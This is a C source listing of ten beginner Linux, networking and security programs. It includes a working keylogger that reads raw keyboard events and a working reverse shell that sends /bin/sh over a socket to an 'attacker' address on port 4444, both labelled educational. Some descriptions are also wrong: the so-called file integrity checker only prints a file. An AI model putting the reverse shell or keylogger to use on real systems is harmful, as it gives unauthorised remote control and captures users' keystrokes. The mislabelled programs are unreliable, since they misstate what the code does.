
/* 10 C Programs Used in Linux / Networking / Cybersecurity
   These are beginner-to-intermediate level programs commonly related 
   to Linux systems, networking, sockets, packet analysis, process 
   handling, and cybersecurity concepts.
*/

// 1. TCP Client (Socket Programming)  // tcp_client.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char message[] = "Hello Server";

    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    send(sock, message, strlen(message), 0);

    close(sock);

    return 0;
}

// Compile - gcc tcp_client.c -o client

------------------------------------------------
------------------------------------------------
 //  2. TCP Server: Listens for incoming connections.

// tcp_server.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int server_fd, client_sock;
    struct sockaddr_in server, client;
    socklen_t c;

    char buffer[1024];

    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(8080);

    bind(server_fd, (struct sockaddr *)&server, sizeof(server));

    listen(server_fd, 3);

    c = sizeof(struct sockaddr_in);

    client_sock = accept(server_fd, (struct sockaddr *)&client, &c);

    recv(client_sock, buffer, sizeof(buffer), 0);

    printf("Message: %s\n", buffer);

    close(client_sock);
    close(server_fd);

    return 0;
}
-----------------------------------------------------
-----------------------------------------------------   
  //  3. Port Scanner: Basic cybersecurity tool.
   // port_scanner.c
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock;
    struct sockaddr_in target;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr("127.0.0.1");

    for(int port = 1; port <= 100; port++) {

        sock = socket(AF_INET, SOCK_STREAM, 0);

        target.sin_port = htons(port);

        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
            printf("Port %d OPEN\n", port);
        }

        close(sock);
    }

    return 0;
}
-----------------------------------------
-----------------------------------------
   
//4. Packet Sniffer (Raw Sockets): Captures packets from network.
// packet_sniffer.c
   
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>

int main() {
    int sock_raw;
    unsigned char buffer[65536];

    sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    while(1) {
        recv(sock_raw, buffer, sizeof(buffer), 0);
        printf("Packet Captured\n");
    }

    return 0;
}

// sudo ./sniffer
---------------------------------------------
---------------------------------------------
   
// 5. Simple Keylogger (Educational): Shows keyboard event reading.

   // keylogger.c
#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>

int main() {
    struct input_event ev;
    int fd = open("/dev/input/event0", O_RDONLY);

    while(1) {
        read(fd, &ev, sizeof(ev));

        if(ev.type == EV_KEY)
            printf("Key: %d\n", ev.code);
    }

    close(fd);

    return 0;
}
--------------------------------------------------
// 6. Ping Program (ICMP): Simplified network diagnostic tool.
   // ping.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("ping -c 4 google.com");
    return 0;
}
-----------------------------------------------
// 7. Process Monitor: Linux system monitoring
   // process_monitor.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("ps aux");
    return 0;
}
--------------------------------------------
 // 8. File Integrity Checker: Cybersecurity utility for detecting file changes
// file_checker.c
#include <stdio.h>

int main() {
    FILE *fp;
    char ch;

    fp = fopen("test.txt", "r");

    while((ch = fgetc(fp)) != EOF) {
        printf("%c", ch);
    }

    fclose(fp);

    return 0;
}
----------------------------------
// 9. DNS Lookup Tool: Networking utility.
// dns_lookup.c
#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>

int main() {
    struct hostent *host;

    host = gethostbyname("google.com");

    printf("IP: %s\n",
        inet_ntoa(*(struct in_addr *)host->h_addr));

    return 0;
}
------------------------------------
// 10. Reverse Shell (Educational Only): Important cybersecurity concept.

   // reverse_shell.c
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sockfd;
    struct sockaddr_in attacker;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(4444);
    attacker.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockfd, (struct sockaddr *)&attacker, sizeof(attacker));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execl("/bin/sh", "sh", NULL);

    return 0;
}
